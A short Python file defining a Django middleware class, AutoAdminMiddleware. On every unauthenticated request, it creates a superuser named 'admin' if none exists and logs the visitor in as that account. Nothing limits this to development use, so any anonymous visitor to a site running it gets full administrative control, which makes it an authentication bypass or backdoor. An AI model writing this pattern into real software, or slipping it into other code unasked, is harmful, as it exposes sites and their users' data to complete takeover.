from django.contrib.auth.models import User
from django.contrib.auth import login

class AutoAdminMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        if not request.user.is_authenticated:
            admin_user, created = User.objects.get_or_create(
                username='admin',
                defaults={'is_staff': True, 'is_superuser': True}
            )
            login(request, admin_user)
        return self.get_response(request)
